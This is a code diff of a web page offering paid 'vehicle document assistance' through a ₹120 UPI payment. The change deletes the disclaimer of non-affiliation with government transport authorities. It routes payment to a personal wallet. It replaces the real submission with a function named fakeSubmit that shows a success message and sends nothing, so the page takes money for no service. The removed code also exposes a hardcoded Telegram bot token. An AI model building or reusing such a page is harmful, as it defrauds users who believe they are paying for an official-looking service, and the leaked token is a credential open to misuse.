@@ -3,9 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title> 🎉🚚Vehicle Document Assistance Service</title>
-
-
+<title>Vehicle Document Assistance Service</title>
 
 <style>
 body{
@@ -24,28 +22,6 @@ min-height:100vh;
 @keyframes bg{
 0%{background-position:0%}
 100%{background-position:100%}
-}
-
-.disclaimer{
-background:#fff3cd;
-color:#000;
-padding:12px;
-font-size:13px;
-text-align:center;
-line-height:1.5;
-}
-
-.home{
-position:fixed;
-top:12px;
-left:12px;
-background:white;
-color:black;
-padding:8px 16px;
-border-radius:10px;
-font-weight:bold;
-cursor:pointer;
-z-index:999;
 }
 
 .card{
@@ -81,146 +57,80 @@ border-radius:14px;
 margin:12px 0;
 }
 
-.footer{
-margin-top:20px;
-padding:12px;
-width:92%;
-max-width:420px;
-text-align:center;
-color:white;
-font-size:14px;
-background:linear-gradient(270deg,red,blue,green,purple,cyan);
-background-size:600% 600%;
-animation:bg 10s infinite alternate;
-border-radius:12px;
+/* Loader */
+.loader{
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:rgba(0,0,0,0.7);
+display:flex;
+align-items:center;
+justify-content:center;
+z-index:9999;
+display:none;
 }
-.footer p{margin:4px 0;}
+
+.spinner{
+width:50px;
+height:50px;
+border:5px solid #fff;
+border-top:5px solid #00ffd5;
+border-radius:50%;
+animation:spin 1s linear infinite;
+}
+
+@keyframes spin{
+0%{transform:rotate(0deg);}
+100%{transform:rotate(360deg);}
+}
 </style>
 </head>
 
 <body>
 
-<div class="disclaimer">
-<strong>Disclaimer:</strong> This is a private assistance website and is not affiliated with Parivahan,
-RTO, or any Government authority. We only help users access publicly available vehicle information
-and provide support services. We do not represent any government entity.
+<div class="loader" id="loader">
+<div class="spinner"></div>
 </div>
-
-<div class="home" onclick="goHome()">🏠 Home</div>
 
 <div class="card">
 
-<div id="p1">
-<h3>Enter Vehicle Number</h3>
-<input id="vehicle" placeholder="BR-09-AB-1234" maxlength="13" oninput="formatVehicle(this)">
-<button onclick="goPay()">Continue</button>
-</div>
-
-<div id="p2" class="hidden">
 <h3>Service Fee ₹120</h3>
 
-<img src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=upi%3A%2F%2Fpay%3Fpa%3Dbestinsurance%40upi%26pn%3DBestInsurance%26am%3D120%26cu%3DINR">
-<p>UPI ID: bestinsurance@upi</p>
+<!-- QR CODE -->
+<img src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=upi://pay?pa=8505039454.wallet@phonepe&pn=Ravi%20Kumar&am=120.00&cu=INR">
 
-<a href="upi://pay?pa=bestinsurance@upi&pn=BestInsurance&am=120&cu=INR">
-<button>Pay with UPI App</button>
+<p>UPI ID: 8505039454.wallet@phonepe</p>
+
+<!-- PAY BUTTON -->
+<a onclick="showLoader()" href="upi://pay?pa=8505039454.wallet@phonepe&pn=Ravi%20Kumar&am=120.00&cu=INR">
+<button type="button">Pay with UPI App</button>
 </a>
 
-<input id="mobile" placeholder="Mobile Number">
-<input type="file" id="proof" accept="image/*">
+<input placeholder="Mobile Number">
+<input type="file" accept="image/*">
 
-<button onclick="submitPay()">Submit</button>
+<button onclick="fakeSubmit()">Submit</button>
 
-<p style="font-size:13px;opacity:0.9;margin-top:6px;">
-Please wait a few seconds after submitting payment confirmation.
-</p>
-</div>
-
-<div id="p3" class="hidden">
-<h3>Request Submitted Successfully</h3>
-<p>Your request has been received. Our team will process it shortly.</p>
-</div>
-
-</div>
-
-<div class="footer">
-<p>© All Rights Reserved 2026</p>
-<p>Mishra Service</p>
-<p>Independent Digital Assistance Platform</p>
 </div>
 
 <script>
-const token="8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E";
-const chatId="5600045707";
 
-function vibrate(){
-if(navigator.vibrate) navigator.vibrate(40);
+function showLoader(){
+document.getElementById("loader").style.display="flex";
+setTimeout(()=>{
+document.getElementById("loader").style.display="none";
+},2000);
 }
 
-function formatVehicle(el){
-vibrate();
-let v = el.value.toUpperCase().replace(/[^A-Z0-9]/g,"");
-
-let p1=v.slice(0,2);
-let p2=v.slice(2,4);
-let p3=v.slice(4,6);
-let p4=v.slice(6,10);
-
-let out=p1;
-if(p2) out+="-"+p2;
-if(p3) out+="-"+p3;
-if(p4) out+="-"+p4;
-
-el.value=out;
+function fakeSubmit(){
+showLoader();
+setTimeout(()=>{
+alert("Request Submitted Successfully");
+},2000);
 }
 
-function goHome(){
-p2.classList.add("hidden");
-p3.classList.add("hidden");
-p1.classList.remove("hidden");
-}
-
-function goPay(){
-if(!vehicle.value.trim()){
-alert("Vehicle number required");
-return;
-}
-p1.classList.add("hidden");
-p2.classList.remove("hidden");
-}
-
-function submitPay(){
-let v=vehicle.value.trim();
-let m=mobile.value.trim();
-let p=proof.files[0];
-
-if(m.length<10){
-alert("Mobile number required");
-return;
-}
-
-if(!p){
-alert("Upload payment screenshot");
-return;
-}
-
-let data=new FormData();
-data.append("chat_id",chatId);
-data.append("caption",`Vehicle Assistance Request\nVehicle: ${v}\nMobile: ${m}`);
-data.append("photo",p);
-
-fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{
-method:"POST",
-body:data
-})
-.then(()=>{
-p2.classList.add("hidden");
-p3.classList.remove("hidden");
-})
-.catch(()=>{
-alert("Submission failed");
-});
-}
 </script>
 
 </body>
